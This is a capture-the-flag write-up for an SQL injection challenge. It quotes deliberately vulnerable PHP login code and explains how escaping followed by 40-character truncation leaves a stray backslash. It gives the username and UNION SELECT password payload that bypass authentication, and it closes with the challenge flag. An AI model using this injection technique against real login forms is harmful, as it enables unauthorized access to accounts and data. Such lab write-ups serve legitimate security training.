# [SQL Injection Level 6](http://s1063.vdi.mipt.ru:8000/challenges#SQL%20Injection%20Level%206)
### [Login form](http://chall1.ctf.pwne.xyz:5555/level6/)

# Solution 
Code:
```php
$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']);

$username = substr($username, 0, 40);
$password = substr($password, 0, 40);

$query = "SELECT * FROM users WHERE username='{$username}' AND password='{$password}'";

$result = mysqli_query($conn, $query);

if (mysqli_num_rows($result) == 1)
{
	echo $success_page;
}
```
The `mysqli_real_escape_string()` function escapes special characters in a string for use in an SQL statement. Basically what it does: 
finds symbols like `'` or `\n` and adds backslash before it: `'` -> `\'`. 

Then we trim exactly 40 symbols. 

So for example if login equals `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'` (39 `a`'s and `'`), after 
`mysqli_real_escape_string()` we get `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\'` and 
after `substr` we get `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\`, so the whole query is:
`SELECT * FROM users WHERE username='aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\' AND password='{$password}'`.

Therefore if in password we input something like ` union select 0, 0, 0; #` the query become:
`SELECT * FROM users WHERE username='aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\' AND password=' union select 0, 0, 0; #'`, where 

**Answer**: `flag{1061879a8cfa6cd8a970220f4ca83e26}`